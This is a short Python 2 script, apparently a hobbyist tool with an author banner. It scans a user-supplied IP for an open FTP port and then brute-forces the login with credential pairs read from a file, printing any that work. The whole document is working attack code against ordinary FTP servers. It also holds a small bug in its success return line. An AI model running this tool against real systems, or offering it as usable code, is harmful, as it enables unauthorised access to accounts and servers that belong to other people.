import ftplib
import socket

print '\t\t\t ######################################'
print '\t\t\t ##    Proudly Made By An INDIAN     ##'
print '\t\t\t ##   Author : Rohit Saxsena INDIA   ##'
print '\t\t\t ######################################'



def portScan(host) :
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect_ex((host, 21))
    if (connect == 0) :
        print  "[+]\tPort 21: Open"
        bruteLogin(host,passwdFile)
        
    else :
        print "[-]\tPort 21: Close" 
        s.close()

def bruteLogin(hostname,passwdFile):
    P = open(passwdFile, 'r')
    print "Now Trying Bruteforce attack.. Wait"
    for line in P.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1]
        print "[+] Trying :\t" + userName +"/" +passWord
        try :
            ftp = ftplib.FTP(hostname)
            ftp.login(userName,passWord)
            print "\n[*]" +str(hostname) + "FTP Logon succeeded with"+userName+":"+passWord
            ftp.quit()
            return(userName.passWord)
        except Exception,e :
            pass
    print'\n[-] Could not Found'
    return(None,None)
host = raw_input('Enter target IP: ')
passwdFile = "UserAndPass.txt"
portScan(host)

            
